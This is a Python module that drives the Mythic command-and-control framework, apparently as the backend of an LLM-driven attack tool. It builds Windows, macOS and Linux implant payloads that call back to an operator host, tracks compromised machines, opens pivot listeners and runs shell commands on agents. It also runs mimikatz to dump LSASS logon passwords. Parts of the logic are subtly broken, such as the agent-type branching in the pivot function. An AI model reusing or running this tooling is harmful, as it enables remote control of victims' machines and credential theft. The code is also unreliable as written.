"""
Module that handles all responsibilities related
to working with Mythic C2
"""

import json
import os
import socket
import uuid

from dotenv import load_dotenv
from mythic import mythic
from pydantic import UUID4, BaseModel

load_dotenv()


class AgentCommandOutput(BaseModel):
    """result of execute command on Agent"""

    output: str
    mythic_task_id: int
    mythic_payload_id: int
    mythic_payload_uuid: UUID4


class NewPayloadOutput(BaseModel):
    """result of create new payload, log is from build"""

    payload_uuid: UUID4
    payload_id: int
    status: str
    raw_log: str


class MythicClient:
    """Mythic C2 connection and operations"""

    def __init__(self) -> None:
        self._instance = None

    @property
    def connected(self) -> bool:
        return self._instance is not None

    async def connect(self) -> None:
        self._instance = await mythic.login(
            username=os.getenv("MYTHIC__USERNAME"),
            password=os.getenv("MYTHIC__PASSWORD"),
            server_ip=os.getenv("MYTHIC__SERVER_IP"),
            server_port=os.getenv("MYTHIC__SERVER_PORT"),
            timeout=-1,
        )

    async def disconnect(self) -> None:
        self._instance = None

    async def create_payload(
        self,
        file_name: str = "nt-merlin",
        lhost: str = "local",
        lport: int = 4329,
        os_type: str = "Windows",
        payload_type: str = "None",
    ) -> NewPayloadOutput:
        """create payload and save, nt-merlin-http by default"""
        if lhost == "local":
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("1.1", 80))
                lhost = s.getsockname()[0]
        if lport == -1:
            lport = os.getenv("MYTHIC__PAYLOAD_PORT_HTTP")
        if payload_type == "None":
            payload_type = {
                "Windows": "merlin",
                "macOS": "poseidon",
                "Linux": "poseidon",
            }.get(os_type)

        payload_response = await mythic.create_payload(
            mythic=self._instance,
            payload_type_name=payload_type,
            filename=file_name,
            operating_system=os_type,
            commands=[],
            c2_profiles=[
                {
                    "c2_profile": "http",
                    "c2_profile_parameters": {
                        "callback_host": lhost,
                        "callback_port": lport,
                    },
                }
            ],
            build_parameters=[
                {"name": "mode", "value": "default"},
                {"name": "garble", "value": False},
            ],
            return_on_complete=True,
        )
        p_uuid = payload_response["uuid"]
        p_id = payload_response["id"]
        status = payload_response["build_phase"]
        raw_log = payload_response["build_message"]
        return NewPayloadOutput(
            payload_uuid=p_uuid, payload_id=p_id, status=status, raw_log=raw_log
        )

    async def get_commands_for_payload(
        self, p_type: str = "merlin", os_type: str = "Windows"
    ) -> list[str]:
        """for llm get all available commands by type and os"""
        resp = await mythic.get_all_commands_for_payloadtype(
            mythic=self._instance, payload_type_name=p_type
        )
        cmd_list: list[str] = []
        for cmd in resp:
            at_os = cmd["attributes"]["supported_os"]
            if not at_os or os_type in at_os:
                cmd_list.append(cmd["cmd"])
        return cmd_list

    async def pivoting_agent(self, display_id, lport, agent_type) -> str:
        """forward agent via itself, return status"""
        command_name, parameters = "", ""
        if agent_type == "merlin":
            command_name = "listener"
            parameters = f"start tcp 0.0.0.0:{lport}"
        if agent_type == "poseidon":
            command_name = "link_tcp"
            parameters = f"0.0.0.0 {lport}"
        if agent_type == "apollo":
            command_name = "link"
            parameters = f"0.0.0.0 {lport}"
        else:
            return "fail"
        status = await mythic.issue_task(
            mythic=self._instance,
            command_name=command_name,
            parameters=parameters,
            callback_display_id=display_id,
            timeout=30,
            wait_for_complete=True,
        )
        return status

    async def get_callback_after(self, rhost) -> tuple[str, str, int]:
        """get os, status, display_id of new callback,
        you must run this after payload"""
        custom_attributes = """
        id
        host
        ip
        user
        payload {
            os
            id
            uuid
        }
        """
        result = await mythic.get_all_active_callbacks(
            mythic=self._instance, custom_return_attributes=custom_attributes
        )
        if res_c := next(
            (
                (i["payload"]["os"], i["id"])
                for i in result
                for ip in json.loads(i["ip"])
                if ip == rhost
            ),
            None,
        ):
            os_type, d_id = res_c
            return os_type, "success", d_id

        return "Linux", "fail", 1

    async def get_os_by_display_id(self, display_id) -> tuple[str, str, str]:
        """get OS/hostname by callback display id to Agent"""
        custom_attributes = """
        id
        host
        payload {
            os
        }
        """
        result = await mythic.get_all_active_callbacks(
            mythic=self._instance, custom_return_attributes=custom_attributes
        )
        if res_c := next(
            ((i["host"], i["payload"]["os"]) for i in result if i["id"] == display_id),
            None,
        ):
            host, os_type = res_c
            return host, os_type, "success"
        return "windows", "Windows", "fail"

    async def get_callback_before(self, rhost) -> tuple[str, str, int]:
        """get os, status, display_id of new callback,
        you must run payload after this func or with timeout"""
        async for c in mythic.subscribe_new_callbacks(
            mythic=self._instance, batch_size=1
        ):
            if c[0]["external_ip"] == rhost:
                return c[0]["os"], "success", c[0]["display_id"]
        return "linux", "fail", 1

    async def check_status(self, callback_display_id: int) -> str:
        """check status of agent, if there is display_id in active
        -> agent callback not completely dead"""
        if self._instance is None:
            await self.connect()
        custom_attributes = """
        display_id
        """
        result = await mythic.get_all_active_callbacks(
            mythic=self._instance, custom_return_attributes=custom_attributes
        )
        has_id = any(i.get("display_id") == callback_display_id for i in result)
        if has_id:
            return "success"
        return "fail"

    async def get_payload_ids(self, callback_display_id) -> tuple[int, UUID4]:
        """get payload id and uuid from display id"""
        custom_attributes = """
        id
        payload {
            id
            uuid
        }
        """
        result = await mythic.get_all_active_callbacks(
            mythic=self._instance, custom_return_attributes=custom_attributes
        )
        callback = next((i for i in result if i.get("id") == callback_display_id), None)
        if callback and (payload := callback.get("payload")):
            return payload.get("id"), payload.get("uuid")
        return 1, uuid.uuid4()

    async def execute_local_command(
        self, cmd: str, callback_display_id: int, timeout: int = 5000
    ) -> AgentCommandOutput:
        """async function to execute command on zero agent via shell agent
        and timeout, inside, there is a subscription to graphql event
        at the end of the task"""
        output = await mythic.issue_task_and_waitfor_task_output(
            mythic=self._instance,
            command_name="shell",
            parameters=cmd,
            callback_display_id=callback_display_id,
            timeout=timeout,
        )
        mythic_t_id = callback_display_id
        mythic_p_id, mythic_p_uuid = await self.get_payload_ids(callback_display_id)

        return AgentCommandOutput(
            output=str(output),
            mythic_task_id=mythic_t_id,
            mythic_payload_id=mythic_p_id,
            mythic_payload_uuid=mythic_p_uuid,
        )

    async def execute_agent_command(
        self, cmd: str, params: str, callback_display_id: int, timeout=3000
    ) -> AgentCommandOutput:
        """execute cmd with params on remote agent"""
        output = await mythic.issue_task_and_waitfor_task_output(
            mythic=self._instance,
            command_name=cmd,
            parameters=params,
            callback_display_id=callback_display_id,
            timeout=timeout,
        )
        mythic_p_id, mythic_p_uuid = await self.get_payload_ids(callback_display_id)
        return AgentCommandOutput(
            output=str(output),
            mythic_task_id=1,
            mythic_payload_id=mythic_p_id,
            mythic_payload_uuid=mythic_p_uuid,
        )

    async def mimikatz_on_agent(self, display_id, agent_type) -> tuple[str, int, UUID4]:
        """run mimikatz from agent to dump LSASS, mostly for agent pivoting"""
        if agent_type == "apollo":
            result: AgentCommandOutput = await self.execute_agent_command(
                cmd="mimikatz",
                params="""-Command "sekurlsa::minidump C:\\Temp\\ls.dmp" """
                """ "sekurlsa::logonPasswords" """,
                callback_display_id=display_id,
            )
            return result
